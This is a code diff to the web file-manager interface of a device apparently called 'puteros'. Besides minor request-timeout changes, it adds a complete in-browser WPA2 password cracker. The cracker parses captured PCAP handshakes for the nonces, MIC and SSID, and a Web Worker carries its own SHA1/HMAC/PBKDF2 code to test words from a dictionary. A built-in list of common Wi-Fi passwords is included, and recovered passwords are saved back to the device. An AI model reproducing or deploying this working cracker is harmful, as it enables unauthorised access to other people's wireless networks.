@@ -113,7 +113,9 @@ async function requestPost (url, param) {
         reject(new Error(`Request failed with status ${req.status}`));
       }
     };
-    req.onerror = () => reject(new Error("Network error"));
+    req.onerror   = () => reject(new Error("Network error"));
+    req.ontimeout = () => reject(new Error("Request timed out"));
+    req.timeout   = 30000;
     req.send(fd);
   });
 }
@@ -248,6 +250,7 @@ function renderFileRow(fileList) {
       e.querySelector(".col-name").setAttribute("title", name);
       e.querySelector(".col-size").textContent = size;
       e.querySelector(".col-action").classList.add("type-file");
+      if (name.toLowerCase().endsWith('.pcap')) e.querySelector(".col-action").classList.add("type-pcap");
 
       let downloadUrl = `/download?file=${encodeURIComponent(dPath)}`;
       if (IS_DEV) downloadUrl = "/puteros" + downloadUrl;
@@ -593,6 +596,528 @@ $(".file-content").addEventListener("keyup", function (e) {
     $(".act-save-edit-file").disabled = !isModified(e.target);
   }
 });
+
+// ── Crack: state ─────────────────────────────────────────────
+let _crackRunning  = false;
+let _crackStop     = false;
+let _crackFilePath = null;
+
+// ── Crack: helpers ────────────────────────────────────────────
+function _byteCmp(a, b, len) {
+  for (let i = 0; i < len; i++) {
+    if (a[i] < b[i]) return -1;
+    if (a[i] > b[i]) return  1;
+  }
+  return 0;
+}
+
+function _arrEq6(a, b) {
+  for (let i = 0; i < 6; i++) if (a[i] !== b[i]) return false;
+  return true;
+}
+
+function _buildPrfData(ap, sta, anonce, snonce) {
+  const p = new Uint8Array(76);
+  let o = 0;
+  if (_byteCmp(ap, sta, 6) < 0) { p.set(ap, o); o += 6; p.set(sta, o); o += 6; }
+  else                           { p.set(sta, o); o += 6; p.set(ap, o); o += 6; }
+  if (_byteCmp(anonce, snonce, 32) < 0) { p.set(anonce, o); o += 32; p.set(snonce, o); }
+  else                                  { p.set(snonce, o); o += 32; p.set(anonce, o); }
+  return p;
+}
+
+function _ssidFromFilename(path) {
+  const base = path.substring(path.lastIndexOf('/') + 1);
+  const u = base.indexOf('_');
+  const d = base.lastIndexOf('.');
+  if (u >= 0 && d > u + 1) return base.substring(u + 1, Math.min(d, u + 1 + 32));
+  return null;
+}
+
+// ── Crack: PCAP / EAPOL parser ────────────────────────────────
+const _EAPOL_SNAP = [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E];
+
+function _findSnap(d, start, flen) {
+  for (let i = 0; i + 8 <= flen; i++) {
+    let ok = true;
+    for (let k = 0; k < 8; k++) if (d[start + i + k] !== _EAPOL_SNAP[k]) { ok = false; break; }
+    if (ok) return i;
+  }
+  return -1;
+}
+
+function parsePcap(data, filePath) {
+  let pos = 0, linktype = 105;
+  if (data.length < 24) return null;
+  if (data[0] === 0xD4 && data[1] === 0xC3 && data[2] === 0xB2 && data[3] === 0xA1) {
+    linktype = (data[20] | (data[21] << 8) | (data[22] << 16) | (data[23] << 24)) >>> 0;
+    pos = 24;
+  }
+
+  let ssidBytes = null, gotAnonce = false;
+  let anonce = null, ap = null, sta = null;
+  let pendM2 = false, pendSta = null, pendAp = null;
+  let pendSnonce = null, pendMic = null, pendEapol = null;
+  let hs = null;
+
+  while (pos + 16 < data.length) {
+    const incl = (data[pos+8] | (data[pos+9]<<8) | (data[pos+10]<<16) | (data[pos+11]<<24)) >>> 0;
+    pos += 16;
+    if (incl === 0 || incl > 65535 || pos + incl > data.length) break;
+    const recStart = pos;
+    pos += incl;
+    if (incl > 512) continue;
+
+    let off = 0;
+    if (linktype === 127) {
+      if (incl < 4) continue;
+      off = data[recStart + 2] | (data[recStart + 3] << 8);
+      if (off >= incl) continue;
+    }
+    const fs = recStart + off, flen = incl - off;
+    if (flen < 2) continue;
+
+    const fc   = data[fs] | (data[fs + 1] << 8);
+    const fcTyp = (fc & 0x000C) >> 2;
+    const fcSub = (fc & 0x00F0) >> 4;
+
+    if (fcTyp === 0 && fcSub === 8 && flen >= 36 && !ssidBytes) {
+      let p = 36;
+      while (p + 2 <= flen) {
+        const id = data[fs + p], elen = data[fs + p + 1];
+        if (p + 2 + elen > flen) break;
+        if (id === 0 && elen > 0 && elen <= 32) { ssidBytes = data.slice(fs + p + 2, fs + p + 2 + elen); break; }
+        p += 2 + elen;
+      }
+      continue;
+    }
+
+    if (fcTyp !== 2) continue;
+
+    const snap = _findSnap(data, fs, flen);
+    if (snap < 0 || snap + 9 >= flen) continue;
+
+    const eapolOff = fs + snap + 8, avail = flen - snap - 8;
+    if (data[eapolOff + 1] !== 0x03) continue;
+
+    const eapLen = (data[eapolOff + 2] << 8) | data[eapolOff + 3];
+    let total = 4 + eapLen;
+    if (total < 97 || avail < 97) continue;
+    if (total > avail) total = avail;
+    if (total > 300) continue;
+
+    const keyOff = eapolOff + 4;
+    const ki    = (data[keyOff + 1] << 8) | data[keyOff + 2];
+    const ack   = !!(ki & 0x0080), mic = !!(ki & 0x0100), inst = !!(ki & 0x0040);
+
+    if (ack && (!mic || inst)) {
+      ap = data.slice(fs + 10, fs + 16);
+      sta = data.slice(fs + 4, fs + 10);
+      anonce = data.slice(keyOff + 13, keyOff + 45);
+      gotAnonce = true;
+      if (pendM2 && _arrEq6(pendSta, sta) && _arrEq6(pendAp, ap)) {
+        hs = { ap, sta, anonce, snonce: pendSnonce, mic: pendMic, eapol: pendEapol };
+      }
+    } else if (!ack && mic && !inst) {
+      let nz = true;
+      for (let z = 0; z < 32 && nz; z++) nz = data[keyOff + 13 + z] === 0;
+      if (nz) continue;
+
+      const src = data.slice(fs + 10, fs + 16), dst = data.slice(fs + 4, fs + 10);
+      if (gotAnonce && _arrEq6(src, sta) && _arrEq6(dst, ap)) {
+        const sn     = data.slice(keyOff + 13, keyOff + 45);
+        const m2Mic  = new Uint8Array(data.slice(eapolOff + 81, eapolOff + 97));
+        const ef     = new Uint8Array(data.slice(eapolOff, eapolOff + total));
+        ef.fill(0, 81, 97);
+        hs = { ap, sta, anonce, snonce: sn, mic: m2Mic, eapol: ef };
+      } else {
+        pendM2 = true; pendSta = src; pendAp = dst;
+        pendSnonce = data.slice(keyOff + 13, keyOff + 45);
+        pendMic    = new Uint8Array(data.slice(eapolOff + 81, eapolOff + 97));
+        const ef   = new Uint8Array(data.slice(eapolOff, eapolOff + total));
+        ef.fill(0, 81, 97);
+        pendEapol = ef;
+      }
+    }
+  }
+
+  if (!hs) return null;
+  if (!ssidBytes) {
+    const s = _ssidFromFilename(filePath);
+    if (!s) return null;
+    ssidBytes = new TextEncoder().encode(s);
+  }
+  hs.ssidBytes = ssidBytes;
+  hs.ssid      = new TextDecoder().decode(ssidBytes);
+  hs.prfData   = _buildPrfData(hs.ap, hs.sta, hs.anonce, hs.snonce);
+  return hs;
+}
+
+// ── Crack: Web Worker ─────────────────────────────────────────
+let _crackWorker = null;
+
+const _CRACK_WORKER_SRC = `
+const _W=new Int32Array(80),_SMSG=new Uint8Array(512),_SOUT=new Uint8Array(20);
+const _HINN=new Uint8Array(512),_HOUT=new Uint8Array(84),_HIH=new Uint8Array(20);
+const _U=new Uint8Array(20),_T1=new Uint8Array(20),_T2=new Uint8Array(20);
+const _PMK=new Uint8Array(32),_SB=new Uint8Array(40),_K64=new Uint8Array(64);
+const _PRE1={ip:new Uint8Array(64),op:new Uint8Array(64)};
+const _PRE2={ip:new Uint8Array(64),op:new Uint8Array(64)};
+const _PRE3={ip:new Uint8Array(64),op:new Uint8Array(64)};
+const _PWBUF=new Uint8Array(64);
+const _enc=new TextEncoder();
+const _PRF_LABEL=new Uint8Array([80,97,105,114,119,105,115,101,32,107,101,121,32,101,120,112,97,110,115,105,111,110,0]);
+let _pin=null,_stop=false;
+
+function _sha1(src,sLen,out){
+  if(src!==_SMSG)_SMSG.set(src.subarray(0,sLen));
+  const k=(55-sLen%64+64)%64,mLen=sLen+1+k+8;
+  _SMSG[sLen]=0x80;_SMSG.fill(0,sLen+1,mLen);
+  const ml=sLen*8;
+  _SMSG[mLen-8]=_SMSG[mLen-7]=_SMSG[mLen-6]=_SMSG[mLen-5]=0;
+  _SMSG[mLen-4]=(ml>>>24)&0xFF;_SMSG[mLen-3]=(ml>>>16)&0xFF;
+  _SMSG[mLen-2]=(ml>>>8)&0xFF;_SMSG[mLen-1]=ml&0xFF;
+  let h0=0x67452301,h1=0xEFCDAB89,h2=0x98BADCFE,h3=0x10325476,h4=0xC3D2E1F0;
+  for(let off=0;off<mLen;off+=64){
+    for(let i=0;i<16;i++)_W[i]=(_SMSG[off+i*4]<<24)|(_SMSG[off+i*4+1]<<16)|(_SMSG[off+i*4+2]<<8)|_SMSG[off+i*4+3];
+    for(let i=16;i<80;i++){const x=_W[i-3]^_W[i-8]^_W[i-14]^_W[i-16];_W[i]=(x<<1)|(x>>>31);}
+    let a=h0,b=h1,c=h2,d=h3,e=h4;
+    for(let i=0;i<80;i++){
+      let f,K;
+      if(i<20){f=(b&c)|(~b&d);K=0x5A827999;}
+      else if(i<40){f=b^c^d;K=0x6ED9EBA1;}
+      else if(i<60){f=(b&c)|(b&d)|(c&d);K=0x8F1BBCDC;}
+      else{f=b^c^d;K=0xCA62C1D6;}
+      const t=(((a<<5)|(a>>>27))+f+e+K+_W[i])|0;
+      e=d;d=c;c=(b<<30)|(b>>>2);b=a;a=t;
+    }
+    h0=(h0+a)|0;h1=(h1+b)|0;h2=(h2+c)|0;h3=(h3+d)|0;h4=(h4+e)|0;
+  }
+  out[0]=(h0>>>24)&0xFF;out[1]=(h0>>>16)&0xFF;out[2]=(h0>>>8)&0xFF;out[3]=h0&0xFF;
+  out[4]=(h1>>>24)&0xFF;out[5]=(h1>>>16)&0xFF;out[6]=(h1>>>8)&0xFF;out[7]=h1&0xFF;
+  out[8]=(h2>>>24)&0xFF;out[9]=(h2>>>16)&0xFF;out[10]=(h2>>>8)&0xFF;out[11]=h2&0xFF;
+  out[12]=(h3>>>24)&0xFF;out[13]=(h3>>>16)&0xFF;out[14]=(h3>>>8)&0xFF;out[15]=h3&0xFF;
+  out[16]=(h4>>>24)&0xFF;out[17]=(h4>>>16)&0xFF;out[18]=(h4>>>8)&0xFF;out[19]=h4&0xFF;
+}
+function _hmacPreInto(key,kLen,pre){
+  _K64.fill(0);
+  if(kLen>64){_sha1(key,kLen,_SOUT);_K64.set(_SOUT.subarray(0,20));}
+  else _K64.set(key.subarray(0,kLen));
+  for(let i=0;i<64;i++){pre.ip[i]=_K64[i]^0x36;pre.op[i]=_K64[i]^0x5C;}
+}
+function _hmacFin(pre,data,dLen,out){
+  _HINN.set(pre.ip,0);_HINN.set(data.subarray(0,dLen),64);
+  _sha1(_HINN,64+dLen,_HIH);
+  _HOUT.set(pre.op,0);_HOUT.set(_HIH,64);
+  _sha1(_HOUT,84,out);
+}
+function _pbkdf2(pre,ssidBytes){
+  const sLen=ssidBytes.length;
+  for(let blk=1;blk<=2;blk++){
+    _SB.set(ssidBytes,0);_SB[sLen]=0;_SB[sLen+1]=0;_SB[sLen+2]=0;_SB[sLen+3]=blk;
+    _hmacFin(pre,_SB,sLen+4,_U);
+    const T=blk===1?_T1:_T2;T.set(_U);
+    for(let i=1;i<4096;i++){_hmacFin(pre,_U,20,_U);for(let j=0;j<20;j++)T[j]^=_U[j];}
+    const oo=(blk-1)*20,ol=Math.min(20,32-oo);_PMK.set(T.subarray(0,ol),oo);
+  }
+}
+function _tryPw(pw,hs){
+  const r=_enc.encodeInto(pw,_PWBUF);
+  _hmacPreInto(_PWBUF,r.written,_PRE1);
+  _pbkdf2(_PRE1,hs.ssidBytes);
+  _hmacPreInto(_PMK,32,_PRE2);
+  _hmacFin(_PRE2,_pin,_pin.length,_SOUT);
+  _hmacPreInto(_SOUT,16,_PRE3);
+  _hmacFin(_PRE3,hs.eapol,hs.eapol.length,_SOUT);
+  for(let i=0;i<16;i++)if(_SOUT[i]!==hs.mic[i])return false;
+  return true;
+}
+
+let _wasm=null,_wasmMem=null,_pPw,_pSsid,_pPrf,_pEapol,_pMic;
+
+async function _loadWasm(){
+  try{
+    const r=await fetch('/crack.wasm');
+    if(!r.ok)return false;
+    const {instance:inst}=await WebAssembly.instantiate(await r.arrayBuffer(),{});
+    const e=inst.exports;
+    _wasmMem=new Uint8Array(e.memory.buffer);
+    _pPw=e.wasm_pw_buf();_pSsid=e.wasm_ssid_buf();
+    _pPrf=e.wasm_prf_data_buf();_pEapol=e.wasm_eapol_buf();_pMic=e.wasm_mic_buf();
+    _wasm=e;return true;
+  }catch(e){return false;}
+}
+
+onmessage=async function(e){
+  const msg=e.data;
+  if(msg.type==="stop"){_stop=true;return;}
+  if(msg.type!=="start")return;
+  _stop=false;
+  const hs=msg.hs,words=msg.words,total=words.length;
+
+  const wasmOk=await _loadWasm();
+
+  if(wasmOk){
+    _wasmMem.set(hs.ssidBytes,_pSsid);
+    _wasmMem.set(hs.prfData,_pPrf);
+    _wasmMem.set(hs.eapol,_pEapol);
+    _wasmMem.set(hs.mic,_pMic);
+  } else {
+    _pin=new Uint8Array(100);
+    _pin.set(_PRF_LABEL,0);
+    _pin.set(hs.prfData,_PRF_LABEL.length);
+  }
+
+  let tested=0,lastUpd=Date.now();
+  for(let i=0;i<total&&!_stop;i++){
+    let hit;
+    if(wasmOk){
+      const r=_enc.encodeInto(words[i],_PWBUF);
+      _wasmMem.set(_PWBUF.subarray(0,r.written),_pPw);
+      hit=_wasm.wasm_try_password(r.written,hs.ssidBytes.length,hs.eapol.length)!==0;
+    }else{
+      hit=_tryPw(words[i],hs);
+    }
+    tested++;
+    const now=Date.now();
+    if(now-lastUpd>=150){lastUpd=now;postMessage({type:"progress",tested,total});await new Promise(r=>setTimeout(r,0));}
+    if(hit){postMessage({type:"done",found:true,pw:words[i],tested});return;}
+  }
+  postMessage({type:"done",found:false,stopped:_stop,tested});
+};
+`;
+
+// ── Crack: UI helpers ─────────────────────────────────────────
+function _crackSetPhase(phase) {
+  $(".crack-phase-dict").classList.toggle("hidden", phase !== "dict");
+  $(".crack-phase-run").classList.toggle("hidden", phase !== "run");
+  $(".crack-result").classList.add("hidden");
+  $(".act-crack-go").classList.toggle("hidden", phase !== "dict");
+  $(".act-crack-stop").classList.toggle("hidden", phase !== "run");
+  $(".act-crack-retry-save").classList.add("hidden");
+}
+
+function updateCrackProgress(tested, total, wps, eta) {
+  const pct = total > 0 ? Math.round(tested * 100 / total) : 0;
+  $(".crack-bar").style.width = pct + "%";
+  $(".crack-bar-pct").textContent = pct + "%";
+  let stats = tested + " / " + total;
+  if (wps > 0) {
+    stats += "  " + (wps >= 1000 ? (wps / 1000).toFixed(1) + "k/s" : wps + "/s");
+    if (eta > 0) {
+      const etaStr = eta >= 60 ? Math.floor(eta/60) + "m" + String(eta % 60).padStart(2, "0") + "s" : eta + "s";
+      stats += "  ETA " + etaStr;
+    }
+  }
+  $(".crack-stats").textContent = stats;
+}
+
+let _crackFoundPw = null;
+
+async function _saveCrack(pw) {
+  $(".act-crack-retry-save").classList.add("hidden");
+  try {
+    const fd = new FormData();
+    fd.append("command", "saveCrack");
+    fd.append("pcap", _crackFilePath);
+    fd.append("pw", pw);
+    const r = await fetch("/", { method: "POST", body: fd });
+    if (!r.ok) throw new Error(await r.text());
+    $(".crack-result").textContent += "  [saved]";
+  } catch (err) {
+    $(".crack-result").textContent += "  [save failed: " + err.message + "]";
+    $(".act-crack-retry-save").classList.remove("hidden");
+  }
+}
+
+function _crackDone(msg, pw) {
+  $(".crack-result").textContent = msg;
+  $(".crack-result").classList.remove("hidden");
+  $(".act-crack-stop").classList.add("hidden");
+  $(".act-crack-go").classList.remove("hidden");
+  $(".act-crack-go").disabled = true;
+  _crackFoundPw = pw || null;
+  if (_crackFoundPw) _saveCrack(_crackFoundPw);
+}
+
+// ── Crack: builtin wordlist ───────────────────────────────────
+const _BUILTIN_DICT = [
+  "12345678","123456789","1234567890","11111111","00000000",
+  "87654321","11223344","12344321","99999999","88888888",
+  "55555555","12121212","13131313","10101010","98765432",
+  "12341234","11112222","22222222","33333333","44444444",
+  "66666666","77777777","01234567","20202020","19191919",
+  "password","password1","passw0rd","pass1234","password12",
+  "password123","admin123","admin1234","admin2020","root1234",
+  "master12","login123","access14","letmein1","trustno1",
+  "welcome1","changeme","default1","guest1234","user1234",
+  "test1234","temp1234","pass12345","p@ssw0rd","p@ss1234",
+  "qwerty123","qwertyui","qwerty12","qwer1234","qwerasdf",
+  "asdfghjk","asdf1234","zxcvbnm1","1234asdf","1234qwer",
+  "1q2w3e4r","zaq12wsx","1qaz2wsx","qazwsx123","!q2w3e4r",
+  "wifi1234","wifi12345","wlan1234","router12","netgear1",
+  "linksys1","dlink1234","tplink12","huawei12","modem123",
+  "internet","wireless","network1","connect1","homewifi",
+  "mywifi123","wifiwifi","setup1234","broadband","fiber123",
+  "abc12345","abcd1234","1234abcd","aa123456","a1234567",
+  "a1b2c3d4","aaa11111","xyz12345","system12","server12",
+  "cisco123","ubnt1234","mikrotik","radius12","monitor1",
+  "14141414","12345679","11111112","01020304","02468024",
+  "13572468","10203040","11235813","31415926","27182818"
+];
+
+// ── Crack: dict list ──────────────────────────────────────────
+async function loadDictList() {
+  const sel = $(".crack-dict-select");
+  sel.innerHTML = "";
+  $(".act-crack-go").disabled = false;
+
+  const builtin = document.createElement("option");
+  builtin.value = "__builtin__";
+  builtin.textContent = "built-in (" + _BUILTIN_DICT.length + " words)";
+  sel.appendChild(builtin);
+
+  try {
+    const res   = await requestPost("/", { command: "pw", param: "list" });
+    const files = res.split("\n")
+      .filter(Boolean)
+      .map(l => l.split(":")[0])
+      .filter(Boolean);
+    files.forEach(name => {
+      const opt = document.createElement("option");
+      opt.value = name;
+      opt.textContent = name;
+      sel.appendChild(opt);
+    });
+  } catch (_) {}
+}
+
+// ── Crack: runner ─────────────────────────────────────────────
+async function runCrack(pcapPath) {
+  const sel = $(".crack-dict-select");
+  if (!sel || !sel.value) return;
+  const dictPath = sel.value;
+
+  _crackRunning = true;
+  _crackStop    = false;
+  _crackSetPhase("run");
+  updateCrackProgress(0, 0, 0, 0);
+  $(".crack-stats").textContent = "Parsing PCAP...";
+
+  try {
+    let url = "/download?file=" + encodeURIComponent(pcapPath);
+    if (IS_DEV) url = "/puteros" + url;
+    const ac = new AbortController();
+    const tid = setTimeout(() => ac.abort(), 30000);
+    const resp = await fetch(url, { credentials: "include", signal: ac.signal });
+    clearTimeout(tid);
+    if (!resp.ok) throw new Error("HTTP " + resp.status);
+    var pcapData = new Uint8Array(await resp.arrayBuffer());
+  } catch (e) {
+    _crackDone("PCAP error: " + (e.name === "AbortError" ? "timed out" : e.message));
+    _crackRunning = false;
+    return;
+  }
+
+  const hs = parsePcap(pcapData, pcapPath);
+  if (!hs) {
+    _crackDone("No complete WPA2 handshake in PCAP");
+    _crackRunning = false;
+    return;
+  }
+
+  $(".crack-stats").textContent = "Loading dictionary...";
+  let words;
+  if (dictPath === "__builtin__") {
+    words = _BUILTIN_DICT;
+  } else {
+    try {
+      const text = await requestPost("/", { command: "pw", param: "get", name: dictPath });
+      words = text.split("\n")
+        .map(l => l.replace(/\r/g, ""))
+        .filter(l => l.length >= 8 && l.length <= 63);
+    } catch (e) {
+      _crackDone("Dictionary error: " + e.message);
+      _crackRunning = false;
+      return;
+    }
+  }
+
+  const total = words.length;
+  const t0 = Date.now();
+
+  if (_crackWorker) { _crackWorker.terminate(); _crackWorker = null; }
+  const blob = new Blob([_CRACK_WORKER_SRC], { type: "application/javascript" });
+  _crackWorker = new Worker(URL.createObjectURL(blob));
+
+  _crackWorker.onmessage = function(e) {
+    const msg = e.data;
+    if (msg.type === "progress") {
+      const secs = Math.max((Date.now() - t0) / 1000, 0.001);
+      const wps = Math.round(msg.tested / secs);
+      const eta = wps > 0 ? Math.round((total - msg.tested) / wps) : 0;
+      updateCrackProgress(msg.tested, total, wps, eta);
+    } else if (msg.type === "done") {
+      updateCrackProgress(msg.tested || total, total, 0, 0);
+      _crackDone(msg.found ? "Found: " + msg.pw : (msg.stopped ? "Stopped" : "Not found"),
+                 msg.found ? msg.pw : null);
+      _crackWorker.terminate();
+      _crackWorker = null;
+      _crackRunning = false;
+    }
+  };
+
+  _crackWorker.onerror = function(err) {
+    _crackDone("Worker error: " + err.message);
+    _crackWorker.terminate();
+    _crackWorker = null;
+    _crackRunning = false;
+  };
+
+  _crackWorker.postMessage({
+    type: "start",
+    hs: { ssidBytes: hs.ssidBytes, prfData: hs.prfData, eapol: hs.eapol, mic: hs.mic },
+    words
+  });
+}
+
+// ── Crack: event wiring ───────────────────────────────────────
+$(".container").addEventListener("click", async (e) => {
+  const crackBtn = e.target.closest(".act-crack");
+  if (!crackBtn || _crackRunning) return;
+  e.preventDefault();
+  const fpath = crackBtn.closest(".file-row")?.getAttribute("data-file");
+  if (!fpath) return;
+  _crackFilePath = fpath;
+  $(".crack-file-name").textContent = fpath.substring(fpath.lastIndexOf("/") + 1);
+  _crackSetPhase("dict");
+  $(".act-crack-go").textContent = "Crack";
+  Dialog.show("crack");
+  await loadDictList();
+});
+
+$(".act-crack-go").addEventListener("click", () => {
+  if (_crackRunning || !_crackFilePath) return;
+  runCrack(_crackFilePath);
+});
+
+$(".act-crack-stop").addEventListener("click", () => {
+  _crackStop = true;
+  if (_crackWorker) _crackWorker.postMessage({ type: "stop" });
+});
+
+$(".act-crack-retry-save").addEventListener("click", () => {
+  if (_crackFoundPw) _saveCrack(_crackFoundPw);
+});
+
+const _origHide = Dialog.hide.bind(Dialog);
+Dialog.hide = function () {
+  if (_crackWorker) { _crackWorker.terminate(); _crackWorker = null; _crackRunning = false; }
+  _crackStop = true;
+  _crackFoundPw = null;
+  $(".act-crack-retry-save").classList.add("hidden");
+  _origHide();
+};
 
 (async function () {
   try {
